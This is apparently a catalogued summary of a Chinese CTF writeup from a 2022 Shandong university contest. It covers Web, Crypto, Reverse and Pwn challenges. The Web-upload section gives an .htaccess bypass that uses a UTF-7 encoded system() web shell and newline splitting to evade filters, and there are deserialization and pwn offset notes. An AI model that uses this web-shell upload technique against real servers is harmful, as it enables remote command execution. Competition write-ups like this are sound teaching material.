---
title: 第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz
contest: 山东省大学生电子设计大赛
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [Web-upload,.htaccess,UTF-7,加换行,反序列化,成员数绕,MT19937,mt_recover,DSA-r1r2,AntSword流量,RGB转二维码,ezxor,arbitrary]
attack_chain: upload_100(同另一篇,含# define width 1337 trick+SetHandler+UTF-7+加换行)|pop_200: Show_index->Transfer->Transfer->File_operations链|签到/凯撒/三层base|mt: 32位素数+init+enc+recover+rrecover推|easy: DSA r1=r2|hacker: 蚁剑流量147流zip|draw: RGB转01+PIL画图|ezxor: x[i]^y[i]^ord('a')|arbitrary: read(14)+read(15)+write(-0x2)
key_payload: # define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system+换行绕关键字|class Transfer->method=Transfer->method=File_operations|recover(c)=inverse_right(18)+inverse_left_mask(15,4022730752)+inverse_left_mask(7,2636928640)+inverse_right(11)|rrecover(last)=((last-i)*inv)%n|k=(h1*r2-h2*r1)*invert(s1*r2-s2*r1,q)%q; flag=(k*s1-h1)*invert(r1,q)%q
one_liner: M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1=r2+蚁剑流量+RGB二维码+ezxor+arbitrary
lesson: 1) .htaccess首行#define width 1337 #define height 1337 满足尺寸限制; 2) SetHandler application/x-httpd-php+UTF-7编码(php_flag zend.multibyte 1)+加换行绕关键字; 3) 蚁剑流量特征:b1709fecc8bc5e=doL3Zhci93d3cvaHRtbC91cGxvYWQvcGFzc3dvcmQuanBn(从第二个字符开始是base64); 4) MT19937逆推:recover(4步逆XOR) + rrecover(逆init 100轮) + flag=md5(str(flag)); 5) DSA r1=r2:+已知h1,h2,s1,s2,r1,q 即可逆出k和flag
quality: high
---

## 备注

原文(https://www.ctfiot.com/87116.html)M1mikatz版,2022年12月山东省赛,3支队伍第1/3/7名。

### 题目详情(同上一版,多反推思路)

**Web-upload_100**
- #define width 1337 + #define height 1337 解决文件大小限制
- `<Files ~ "^.ht"> Require all granted` 允许访问
- `SetHandler application/x-httpd-php` 当PHP解析
- `php_flag zend.multibyte 1; php_value zend.script_encoding "UTF-7"` UTF-7编码
- `# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4`
- 加换行绕关键字:`<Fi\nles>` `</Fi\nles>` `SetHa\nndler applic\nation/x-h\nttpd-p\nhp` `ph\np_flag` `ph\np_val\nue`

**Web-pop_200**
- 反序列化链:Show_index->filepage=Transfer->method=Transfer->method=File_operations
- 成员数绕__wakeup

**Crypto-签到/凯撒/三层base**

**Crypto-mt**
```python
def recover(y):
    y = inverse_right(y, 18)
    y = inverse_left_mask(y, 15, 4022730752)
    y = inverse_left_mask(y, 7, 2636928640)
    y = inverse_right(y, 11)
    return y

def rrecover(last):
    n = 1<<32
    inv = gmpy2.invert(1812433253, n)
    for i in range(99, 0, -1):
        last = ((last-i)*inv) % n
        last = inverse_right(last, 30)
    return last

c = 1047573452
tmp = recover(c)
flag = rrecover(tmp)
print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')
```

**Crypto-easy** — DSA r1=r2
- k = (h1*r2 - h2*r1) * gmpy2.invert(s1*r2 - s2*r1, q) % q
- flag = (k*s1 - h1) * gmpy2.invert(r1, q) % q
- flag{md5(str(flag))}

**Re-ezxor**
```python
y = [169, 178, 231, 186, 187, 120, 180, 187, 152, 171, 222, 58, 165, 156, 215, 149, 93, 219, 31, 160, 26, 50, 88, 254, 197, 99, 197, 46, 79, 38, 26, 65, 91, 191, 128, 141, 138, 189]
x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
flag = ''
for i in range(38):
    flag += chr(x[i] ^ y[i] ^ ord('a'))
```

**Pwn-arbitrary**
- read(14) → codebase
- read(15) → codebase2
- codebase = codebase2*0x100000000 + codebase - 0xb17
- write(-0x2, (codebase+0xa46) & 0xffffffff)

## 评级

- **quality: high** — 同前一版合集,多反推脚本(recover/rrecover/DSA/ezxor),作者M1mikatz写出详细逆推思路
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:MT19937 32位素数爆破+recover+rrecover组合是经典Crypto套路
